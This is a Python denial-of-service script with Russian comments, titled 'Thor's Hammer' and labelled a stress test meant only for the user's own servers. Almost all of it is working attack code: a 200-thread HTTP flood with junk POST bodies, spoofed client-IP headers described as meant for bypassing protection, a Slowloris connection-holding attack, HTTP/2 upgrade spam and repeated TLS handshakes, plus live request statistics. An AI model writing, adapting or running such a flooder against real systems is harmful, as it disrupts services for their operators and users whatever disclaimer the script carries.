"""
БОЕВОЙ DDoS СКРИПТ "МОЛОТ ТОРА"
Версия 2.0 - Промышленный стресс-тест
ВНИМАНИЕ: Только для тестирования своих серверов!
"""

import requests
import random
import threading
import time
import socket
import ssl
import http.client
import json
from urllib.parse import urlparse
from concurrent.futures import ThreadPoolExecutor

# === НАСТРОЙКИ ===
TARGET = "http://127.0.0.1"  # Целевой сервер
PORT = 80
DURATION = 60  # Секунд атаки
THREADS = 200  # Количество потоков (можно увеличить до 500+)

# === СТАТУС ===
running = True
stats = {"total": 0, "errors": 0, "status_codes": {}}
start_time = time.time()

# === ГЕНЕРАТОРЫ ДАННЫХ ===
def random_ip():
    return f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
        "Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36",
        "python-requests/2.28.1",
        "curl/7.68.0",
        "",
        "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.0",
        "Dalvik/2.1.0 (Linux; U; Android 8.1.0; SM-G950F Build/M1AJQ)",
        "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    ]
    return random.choice(agents)

def random_path():
    paths = [
        "/", "/games", "/info", "/admin",
        "/wp-admin/install.php?step=1",
        "/.env", "/phpmyadmin",
        "/api/progress", "/api/apps",
        "/download/com.kiloo.subwaysurf/2.3.0_fix01",
        "/static/icons/com.skype.m2.png",
        "/html/apps/com.spongebob.neighbor.png",
        "/vulnerable.php", "/honeypot",
    ]
    return random.choice(paths)

def random_method():
    return random.choices(
        ["GET", "POST", "HEAD", "OPTIONS", "PUT", "DELETE", "PATCH"],
        weights=[60, 20, 5, 5, 3, 3, 4]
    )[0]

def generate_payload(size_kb=10):
    """Генерирует мусорный payload для POST-запросов"""
    return ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=size_kb * 1024))

def generate_headers():
    """Генерирует случайные заголовки для обхода защиты"""
    return {
        "User-Agent": random_user_agent(),
        "Accept": random.choice(["text/html", "application/json", "*/*"]),
        "Accept-Language": random.choice(["ru-RU,ru;q=0.9", "en-US,en;q=0.8", "uk-UA,uk;q=0.9"]),
        "Cache-Control": random.choice(["no-cache", "max-age=0"]),
        "X-Forwarded-For": random_ip(),
        "X-Real-IP": random_ip(),
        "CF-Connecting-IP": random_ip(),
        "Referer": f"http://{random_ip()}/",
        "Connection": random.choice(["keep-alive", "close"]),
        "Content-Type": random.choice(["application/x-www-form-urlencoded", "application/json", "multipart/form-data"]),
    }

# === ТИПЫ АТАК ===

def http_flood(session):
    """Классический HTTP-флуд с рандомными данными"""
    global running, stats
    while running:
        try:
            method = random_method()
            path = random_path()
            url = f"{TARGET}{path}?{random.randint(100000, 999999)}"
            headers = generate_headers()
            
            if method == "GET":
                r = session.get(url, headers=headers, timeout=1, allow_redirects=False)
            elif method == "POST":
                payload = generate_payload(random.randint(1, 10))
                r = session.post(url, headers=headers, data=payload, timeout=1, allow_redirects=False)
            elif method == "HEAD":
                r = session.head(url, headers=headers, timeout=1)
            elif method == "OPTIONS":
                r = session.options(url, headers=headers, timeout=1)
            elif method == "PUT":
                r = session.put(url, headers=headers, data="test", timeout=1)
            elif method == "DELETE":
                r = session.delete(url, headers=headers, timeout=1)
            elif method == "PATCH":
                r = session.patch(url, headers=headers, data="test", timeout=1)
            
            stats["total"] += 1
            code = r.status_code
            stats["status_codes"][code] = stats["status_codes"].get(code, 0) + 1
            if code >= 400:
                stats["errors"] += 1
                
        except Exception:
            stats["errors"] += 1

def slowloris_attack():
    """Медленная атака (открывает соединение и не закрывает)"""
    global running
    while running:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            sock.connect((urlparse(TARGET).hostname, PORT))
            sock.send(b"GET / HTTP/1.1\r\n")
            sock.send(b"Host: " + urlparse(TARGET).hostname.encode() + b"\r\n")
            sock.send(b"User-Agent: Mozilla/5.0\r\n")
            time.sleep(random.uniform(10, 30))  # Держим соединение открытым
            sock.close()
        except:
            pass

def http2_attack():
    """Попытка использовать HTTP/2 (если сервер поддерживает)"""
    global running
    while running:
        try:
            conn = http.client.HTTPSConnection(urlparse(TARGET).hostname, timeout=1)
            conn.request("PRI", "* HTTP/2.0", headers={"Connection": "Upgrade", "Upgrade": "h2c"})
            conn.getresponse()
            conn.close()
        except:
            pass

def ssl_renegotiation():
    """SSL-рененгоциация (нагрузка на CPU)"""
    global running
    while running:
        try:
            context = ssl.create_default_context()
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((urlparse(TARGET).hostname, 443))  # HTTPS
            ssl_sock = context.wrap_socket(sock, server_hostname=urlparse(TARGET).hostname)
            ssl_sock.close()
        except:
            pass

# === ЗАПУСК ===
def run_attack():
    print(f"🔥 ЗАПУСКАЕМ 'МОЛОТ ТОРА'")
    print(f"  Цель: {TARGET}")
    print(f"  Потоков: {THREADS}")
    print(f"  Длительность: {DURATION} сек")
    print(f"  Методы: GET, POST, HEAD, OPTIONS, PUT, DELETE, PATCH")
    print(f"  Векторы: HTTP Flood, Slowloris, HTTP/2, SSL Renegotiation")
    print("\nНажми Ctrl+C для досрочной остановки...")

    # Запускаем HTTP-флуд
    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        sessions = [requests.Session() for _ in range(THREADS)]
        for session in sessions:
            executor.submit(http_flood, session)

    # Запускаем Slowloris (отдельно)
    for _ in range(10):
        threading.Thread(target=slowloris_attack, daemon=True).start()

    # Запускаем HTTP/2 атаку
    for _ in range(5):
        threading.Thread(target=http2_attack, daemon=True).start()

    # Запускаем SSL-рененгоциацию (если цель использует HTTPS)
    for _ in range(5):
        threading.Thread(target=ssl_renegotiation, daemon=True).start()

    # Мониторинг
    last_total = 0
    start_time = time.time()
    while running and time.time() - start_time < DURATION:
        time.sleep(5)
        elapsed = int(time.time() - start_time)
        total = stats["total"]
        errors = stats["errors"]
        speed = (total - last_total) // 5
        last_total = total
        
        codes_str = ", ".join([f"{k}:{v}" for k, v in sorted(stats["status_codes"].items())[:10]])
        print(f"[{elapsed}s] Запросов: {total}, Ошибок: {errors}, Скорость: {speed}/сек")
        print(f"  Коды: {codes_str}")

    print("\n🛑 Атака завершена.")

# === ЗАПУСК ===
if __name__ == "__main__":
    try:
        run_attack()
    except KeyboardInterrupt:
        print("\n🛑 Остановка по Ctrl+C...")
    finally:
        running = False
        print("\n" + "=" * 50)
        print("📊 ИТОГОВАЯ СТАТИСТИКА")
        print(f"  Всего запросов: {stats['total']}")
        print(f"  Ошибок: {stats['errors']}")
        print(f"  Процент ошибок: {stats['errors']/stats['total']*100:.2f}%" if stats['total'] > 0 else "  Нет данных")
        print(f"  Коды ответов:")
        for code, count in sorted(stats["status_codes"].items()):
            print(f"    {code}: {count}")
        print("=" * 50)